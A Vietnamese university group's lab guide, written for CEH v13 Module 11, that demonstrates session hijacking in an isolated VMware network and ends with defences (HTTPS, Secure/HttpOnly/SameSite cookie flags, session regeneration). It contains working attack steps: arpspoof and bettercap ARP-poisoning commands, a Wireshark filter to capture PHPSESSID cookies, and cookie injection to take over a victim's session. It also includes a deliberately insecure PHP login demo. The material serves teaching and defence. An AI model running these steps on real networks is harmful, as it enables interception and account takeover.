# HƯỚNG DẪN THỰC HÀNH CHI TIẾT LAB MÔI TRƯỜNG ẢO (VMWARE WORKSTATION)
## ĐỀ TÀI: TẤN CÔNG CHIẾM QUYỀN ĐIỀU KHIỂN PHIÊN (SESSION HIJACKING)
### Trường Đại học Giao thông vận tải TP.HCM (UTH) — Khoa Công nghệ Thông tin
### Nhóm 22: Phan Nhật Hào — Đào Duy Quân — Nguyễn Quang Vinh
### Chuẩn kiến thức: EC-Council Certified Ethical Hacker (CEH) v13 — Module 11

---

## 📌 TỔNG QUAN VÀ Ý NGHĨA CỦA MÔ HÌNH MÁY ẢO

Trong các đồ án môn học An ninh mạng tại UTH cũng như các chứng chỉ quốc tế (CEH, CompTIA Security+), việc thực hiện tấn công mạng **tuyệt đối không được diễn ra trên máy thật hoặc mạng Internet công cộng**. Thay vào đó, sinh viên cần sử dụng **phần mềm ảo hóa (VMware Workstation Pro hoặc VirtualBox)** để dựng một hệ thống mạng nội bộ cô lập (Isolated Virtual Lab).

Mô hình này gồm 3 thực thể mạng riêng biệt với địa chỉ IP độc lập:
1. **Máy chủ Mục tiêu (Target Web Server):** Chạy ứng dụng web trên giao thức không bảo mật HTTP cổng 80.
2. **Máy Nạn nhân (Victim Client):** Đăng nhập vào ứng dụng web để thực hiện công việc hàng ngày.
3. **Máy Tấn công (Attacker):** Thực hiện bắt gói tin trên đường truyền mạng ảo, trích xuất Cookie và cướp quyền phiên làm việc.

---

# PHẦN I: THIẾT LẬP MÔ HÌNH MẠNG LAB TRÊN VMWARE WORKSTATION PRO

## 1.1. Sơ đồ cấu trúc mạng Lab (Network Topology)

```
                            [ CARD MẠNG ẢO VMWARE: VMnet2 (Host-Only) ]
                                   Dải IP ảo: 192.168.100.0/24
                                                |
            +-----------------------------------+-----------------------------------+
            |                                   |                                   |
            v                                   v                                   v
+-------------------------+         +-------------------------+         +-------------------------+
|    MÁY CHỦ TARGET WEB   |         |    MÁY NẠN NHÂN VICTIM  |         |   MÁY TẤN CÔNG ATTACKER |
| - HĐH: Linux / Windows  |         | - HĐH: Windows 10 / 11  |         | - HĐH: Kali Linux       |
| - IP: 192.168.100.10    |         | - IP: 192.168.100.20    |         | - IP: 192.168.100.30    |
| - Dịch vụ: Apache HTTP  |         | - Trình duyệt: Chrome/  |         | - Công cụ: Wireshark,   |
|   (Cổng 80 - Plaintext) |         |   Edge đăng nhập phiên  |         |   Bettercap, Cookie-Edit|
+-------------------------+         +-------------------------+         +-------------------------+
```

---

## 1.2. Các bước cấu hình Card mạng ảo trên VMware Workstation Pro

### Bước 1: Mở trình quản lý mạng ảo (Virtual Network Editor)
1. Khởi động phần mềm **VMware Workstation Pro** (File cài đặt có sẵn trong thư mục `CEH v13 OCT 2024/CEHv13 ISO/VMware Workstation Pro/VMware-workstation-full-17.5.2-23775571.exe`).
2. Trên thanh menu, chọn: **Edit** $\rightarrow$ **Virtual Network Editor...**
3. Bấm vào nút **Change Settings** ở góc dưới bên phải (yêu cầu quyền Administrator).

### Bước 2: Tạo mạng ảo cô lập VMnet2
1. Nhấn nút **Add Network...** $\rightarrow$ Chọn tên mạng: **VMnet2**.
2. Chọn loại kết nối: **Host-only (connect VMs internally in a private network)**.
3. Tích chọn mục: **Use local DHCP service to distribute IP address to VMs**.
4. Cấu hình dải mạng:
   * **Subnet IP:** `192.168.100.0`
   * **Subnet mask:** `255.255.255.0`
5. Nhấn **Apply** $\rightarrow$ **OK**.

### Bước 3: Gán Card mạng cho từng Máy ảo
Thực hiện lần lượt cho cả 3 máy ảo (Server, Victim, Attacker):
1. Chuột phải vào tên máy ảo trong danh sách VMware $\rightarrow$ chọn **Settings...**
2. Nhấp vào mục **Network Adapter**.
3. Chọn tùy chọn: **Custom: Specific virtual network** $\rightarrow$ chọn **VMnet2 (Host-only)**.
4. Bấm **OK**.

---

## 1.3. Cấu hình địa chỉ IP cho 3 Máy ảo

### Máy 1: Target Web Server (`192.168.100.10`)
* Nếu dùng Ubuntu / Debian: Chỉnh sửa cấu hình mạng netplan hoặc interfaces:
  ```bash
  sudo ip addr add 192.168.100.10/24 dev eth0
  sudo ip link set eth0 up
  ```
* Nếu dùng Windows VM: Mở `Network Connections` $\rightarrow$ Properties của card mạng $\rightarrow$ IPv4:
  * IP address: `192.168.100.10`
  * Subnet mask: `255.255.255.0`
  * Gateway: `192.168.100.1`

### Máy 2: Nạn nhân - Windows Victim VM (`192.168.100.20`)
* Đặt IP tĩnh: `192.168.100.20`, Subnet mask: `255.255.255.0`.

### Máy 3: Tin tặc - Kali Linux Attacker VM (`192.168.100.30`)
* Đặt IP tĩnh trên Kali:
  ```bash
  sudo ifconfig eth0 192.168.100.30 netmask 255.255.255.0 up
  ```

### Kiểm tra thông mạng (Connectivity Verification):
Từ máy Kali Linux (`192.168.100.30`), mở terminal gõ:
```bash
ping -c 3 192.168.100.10   # Ping tới Server
ping -c 3 192.168.100.20   # Ping tới Victim
```
Khi cả 2 lệnh đều trả về `3 packets transmitted, 3 received, 0% packet loss`, môi trường mạng ảo đã thông suốt 100%!

---

# PHẦN II: TRIỂN KHAI ỨNG DỤNG MỤC TIÊU TRÊN MÁY CHỦ TARGET SERVER

Để demo đúng chuẩn CEH v13 và môn học An ninh mạng tại UTH, trên **Máy chủ Target Web (`192.168.100.10`)**, nhóm sử dụng ứng dụng web chạy trên **Apache HTTP Server (Cổng 80 - Giao thức không bảo mật)**.

## 2.1. Lựa chọn ứng dụng Web mục tiêu
Nhóm có thể sử dụng 1 trong 2 giải pháp tiêu chuẩn sau:

### Lựa chọn A: DVWA (Damn Vulnerable Web Application) — Ứng dụng mẫu mực của CEH
* **Bản chất:** Ứng dụng web PHP/MySQL được EC-Council và cộng đồng an ninh mạng sử dụng rộng rãi để thực hành kiểm thử thâm nhập.
* **Cài đặt cực nhanh trên Server Ubuntu bằng lệnh:**
  ```bash
  sudo apt update
  sudo apt install -y apache2 php php-mysqli mariadb-server git
  cd /var/www/html
  sudo git clone https://github.com/digininja/DVWA.git dvwa
  sudo chmod -R 777 dvwa
  sudo systemctl restart apache2
  ```
* **Đường dẫn truy cập:** `http://192.168.100.10/dvwa/login.php`
* **Cơ chế phiên:** Dùng Cookie chuẩn `PHPSESSID` của PHP và cờ `security=low`.

### Lựa chọn B: Ứng dụng Web Cổng thông tin Sinh viên UTH (PHP/Apache)
Nếu muốn giao diện thuần Việt mang tên UTH Portal:
* Tạo file `/var/www/html/login.php` trên Server:
  ```php
  <?php
  session_start();
  if ($_SERVER['REQUEST_METHOD'] === 'POST') {
      if ($_POST['username'] === 'victim' && $_POST['password'] === 'uth123') {
          $_SESSION['user'] = 'Nguyễn Văn Nạn Nhân';
          $_SESSION['mssv'] = '2251120000';
          $_SESSION['sodu'] = '25.000.000 VNĐ';
          header('Location: dashboard.php');
          exit;
      }
  }
  ?>
  <form method="POST">
    <h2>UTH PORTAL - ĐĂNG NHẬP (HTTP CỔNG 80)</h2>
    User: <input name="username" value="victim"><br>
    Pass: <input type="password" name="password" value="uth123"><br>
    <button type="submit">Đăng nhập</button>
  </form>
  ```
* Tạo file `/var/www/html/dashboard.php`:
  ```php
  <?php
  session_start();
  if (!isset($_SESSION['user'])) {
      die("Chưa đăng nhập! Vui lòng vào login.php");
  }
  echo "<h1>HỒ SƠ SINH VIÊN UTH</h1>";
  echo "<p>Họ tên: " . $_SESSION['user'] . "</p>";
  echo "<p>Mã SV: " . $_SESSION['mssv'] . "</p>";
  echo "<p>Số dư ví: " . $_SESSION['sodu'] . "</p>";
  echo "<p><b>Cookie phiên đang dùng: PHPSESSID=" . session_id() . "</b></p>";
  ?>
  ```

---

# PHẦN III: KỊCH BẢN VÀ CÁC BƯỚC DEMO TẤN CÔNG (EXPLOITATION)

Đây là phần trọng tâm để trình diễn trực tiếp hoặc quay video báo cáo:

```
                            QUY TRÌNH TẤN CÔNG TRÊN MÔI TRƯỜNG ẢO
[VM 2: Victim 192.168.100.20]                               [VM 1: Server 192.168.100.10]
      |                                                                   |
      | -------- (1) Đăng nhập HTTP (user: victim, pass: uth123) -------->|
      | <------- (2) Cấp Cookie: PHPSESSID=abc123xyz --------------------|
      |                                                                   |
      |                        [ĐƯỜNG TRUYỀN MẠNG ẢO]                     |
      |                                  |                                |
      |                        (Bị bắt gói tin bởi Wireshark/Bettercap)   |
      |                                  v                                |
      |                     [VM 3: Kali Linux 192.168.100.30]             |
      |                     - Trích xuất: PHPSESSID=abc123xyz             |
      |                     - Mở trình duyệt nạp Cookie qua Cookie-Editor |
      |                     - Gửi Request chiếm phiên:                    |
      |                     --------------------------------------------->|
      |                     <------- (3) Trả về trang cá nhân của Nạn nhân|
```

---

## Bước 1: Nạn nhân đăng nhập hợp lệ trên VM Victim
1. Trên máy ảo **Windows Victim (`192.168.100.20`)**, mở trình duyệt Google Chrome hoặc Edge.
2. Truy cập vào địa chỉ IP của máy chủ web:
   `http://192.168.100.10/login.php` (hoặc `http://192.168.100.10/dvwa/login.php`).
3. Nhập tài khoản:
   * **Username:** `victim` (hoặc `admin` nếu là DVWA)
   * **Password:** `uth123` (hoặc `password` nếu là DVWA)
4. Bấm **Đăng nhập** $\rightarrow$ Trình duyệt chuyển vào trang `dashboard.php`.
5. Nạn nhân nhìn thấy thông tin cá nhân bảo mật và số dư học phí 25.000.000 VNĐ.

---

## Bước 2: Kẻ tấn công bắt gói tin trên VM Kali Linux

Trên máy ảo **Kali Linux (`192.168.100.30`)**:

### Kỹ thuật 1: Đầu độc bảng ARP (ARP Spoofing / MITM)
Do Switch ảo của VMware phân luồng lưu lượng, Attacker cần dùng kỹ thuật Man-in-the-Middle để ép toàn bộ luồng dữ liệu giữa Victim (`192.168.100.20`) và Server (`192.168.100.10`) phải chạy qua card mạng máy Kali.
1. Mở Terminal trên Kali Linux, kích hoạt chuyển tiếp gói tin (IP Forwarding):
   ```bash
   sudo sysctl -w net.ipv4.ip_forward=1
   ```
2. Thực hiện đầu độc bảng ARP bằng công cụ **arpspoof** hoặc **bettercap**:
   * *Cách dùng arpspoof (mở 2 terminal song song):*
     ```bash
     # Terminal 1: Lừa Victim tin rằng Kali chính là Server
     sudo arpspoof -i eth0 -t 192.168.100.20 192.168.100.10

     # Terminal 2: Lừa Server tin rằng Kali chính là Victim
     sudo arpspoof -i eth0 -t 192.168.100.10 192.168.100.20
     ```
   * *Hoặc dùng bettercap (Gọn gàng trong 1 terminal):*
     ```bash
     sudo bettercap -iface eth0
     net.probe on
     set arp.spoof.targets 192.168.100.20
     arp.spoof on
     net.sniff on
     ```

### Kỹ thuật 2: Bắt và giải mã Session Cookie bằng Wireshark
1. Khởi động **Wireshark** trên Kali Linux (không dùng dấu `&` ở cuối để nhập được mật khẩu `sudo`):
   ```bash
   sudo wireshark
   ```
2. Chọn lắng nghe trên card mạng `eth0` (card kết nối vào `VMnet2`).
3. Trong ô Display Filter, gõ cú pháp lọc:
   ```wireshark
   http.cookie contains "PHPSESSID" or (http.request.method == "GET" and http contains "dashboard")
   ```
4. Khi Nạn nhân trên VM Windows lướt web hoặc F5 trang `dashboard.php`, gói tin HTTP lập tức xuất hiện trên Wireshark!
5. Nhấp chuột phải vào gói tin $\rightarrow$ Chọn **Follow** $\rightarrow$ **HTTP Stream**:
   * Quan sát thấy dòng HTTP Request Header dạng **bản rõ (plaintext)**:
     ```http
     GET /dashboard.php HTTP/1.1
     Host: 192.168.100.10
     User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)...
     Cookie: PHPSESSID=4a8f9b2c1d3e5f6a7b8c9d0e1f2a3b4c
     ```
   * 👉 **Attacker đã sở hữu chuỗi Cookie giá trị:** `4a8f9b2c1d3e5f6a7b8c9d0e1f2a3b4c`.

---

## Bước 3: Chiếm quyền phiên làm việc (Session Hijacking via Cookie Injection)

1. Vẫn trên máy ảo **Kali Linux**, mở trình duyệt web Firefox.
2. Thử truy cập thẳng vào trang cá nhân của Nạn nhân:
   `http://192.168.100.10/dashboard.php`
   * **Kết quả:** Server từ chối và báo lỗi *"Chưa đăng nhập! Vui lòng vào login.php"*.
   * *Chứng minh:* Attacker lúc này chưa có phiên làm việc.
3. Nhấn phím `F12` trên bàn phím (hoặc chuột phải chọn **Inspect**), chuyển sang tab **Storage** (hoặc cài sẵn tiện ích **Cookie-Editor**):
   * Chọn mục **Cookies** $\rightarrow$ `http://192.168.100.10`.
   * Nhấn nút **Add (+) / Thêm Cookie**:
     * **Name:** `PHPSESSID`
     * **Value:** `4a8f9b2c1d3e5f6a7b8c9d0e1f2a3b4c` (Giá trị vừa bắt được từ Wireshark)
     * **Path:** `/`
   * Nhấn biểu tượng lưu.
4. Trên trình duyệt Kali Linux, nhấn phím **F5 (Refresh)**:
   * 💥 **KẾT QUẢ BÙNG NỔ:** Trang web lập tức hiển thị toàn bộ hồ sơ của Nạn nhân:
     * Họ tên: *Nguyễn Văn Nạn Nhân*
     * Mã số SV: *2251120000*
     * Số dư ví: *25.000.000 VNĐ*
   * 👉 **Kẻ tấn công đã chiếm quyền phiên làm việc thành công 100% trên môi trường mạng ảo mà hoàn toàn không cần biết mật khẩu của nạn nhân!**

---

# PHẦN IV: TRIỂN KHAI PHÒNG THỦ TRÊN MÔI TRƯỜNG ẢO & KIỂM CHỨNG

Để đồ án đạt điểm tối đa từ Giảng viên, nhóm tiếp tục thực hiện phần phòng thủ:

## 4.1. Bật mã hóa HTTPS (SSL/TLS) trên Máy chủ Target Web
Trên máy ảo Server (`192.168.100.10`):
1. Kích hoạt module SSL của Apache:
   ```bash
   sudo a2enmod ssl
   sudo a2ensite default-ssl.conf
   sudo systemctl restart apache2
   ```
2. Giờ đây web server lắng nghe trên cổng HTTPS `443`.
3. Cho Nạn nhân truy cập qua `https://192.168.100.10/dashboard.php`.
4. **Kiểm chứng lại trên Wireshark của Kali Linux:**
   * Attacker chỉ bắt được các gói tin giao thức **TLSv1.3**.
   * Toàn bộ nội dung Header và Cookie bị mã hóa thành chuỗi ngẫu nhiên (**Encrypted Application Data**), Attacker không còn đọc được bất kỳ ký tự nào của `PHPSESSID`!

## 4.2. Cấu hình cờ bảo mật Cookie trong file cấu hình PHP Server
Trên Server, mở file cấu hình PHP (`/etc/php/8.x/apache2/php.ini`):
```ini
; Chỉ cho phép gửi Cookie qua HTTPS
session.cookie_secure = 1

; Ngăn chặn JavaScript đọc Cookie (chống XSS)
session.cookie_httponly = 1

; Chống tấn công giả mạo CSRF
session.cookie_samesite = "Strict"
```
Khởi động lại Apache: `sudo systemctl restart apache2`.

* **Kiểm chứng cờ `HttpOnly`:** Mở F12 Console trên trình duyệt Nạn nhân gõ:
  ```javascript
  document.cookie
  ```
  Trình duyệt trả về chuỗi rỗng `""` $\rightarrow$ Mã độc không thể đánh cắp Cookie!

## 4.3. Cấu hình tái tạo phiên (Session Regeneration)
Trong file mã nguồn đăng nhập `login.php`, thêm dòng lệnh tái sinh ID ngay sau khi xác thực thành công:
```php
session_regenerate_id(true); // Hủy ID cũ, cấp ID ngẫu nhiên mới chống Session Fixation
```

---

# PHẦN V: TÓM TẮT PHÂN CÔNG THAO TÁC DEMO GIỮA 3 THÀNH VIÊN

Khi trình diễn trước Giảng viên hoặc quay video màn hình:

| Thành viên | Máy ảo phụ trách | Thao tác thực tế |
| :--- | :--- | :--- |
| **Phan Nhật Hào** (PH) | **VMware Host & VM 1 (Server)** | - Mở VMware Workstation, giới thiệu cấu hình card mạng `VMnet2` (`192.168.100.0/24`).<br>- Khởi động dịch vụ Apache Web Server trên VM 1.<br>- Thực hiện cấu hình HTTPS và cờ Cookie ở phần phòng thủ. |
| **Đào Duy Quân** (ĐQ) | **VM 3 (Kali Linux Attacker)** | - Chạy lệnh `arpspoof` / `bettercap` trên Terminal Kali.<br>- Bật Wireshark lọc bắt gói tin HTTP Cookie.<br>- Mở Firefox trên Kali, dùng Cookie-Editor dán cookie và F5 chiếm phiên. |
| **Nguyễn Quang Vinh** (NV) | **VM 2 (Windows Victim) & Thuyết minh** | - Thao tác đóng vai Nạn nhân đăng nhập trên Windows VM.<br>- Thuyết trình giải thích bản chất lý thuyết cho Giảng viên.<br>- Thực hiện kiểm chứng F12 Console sau khi bật phòng thủ. |
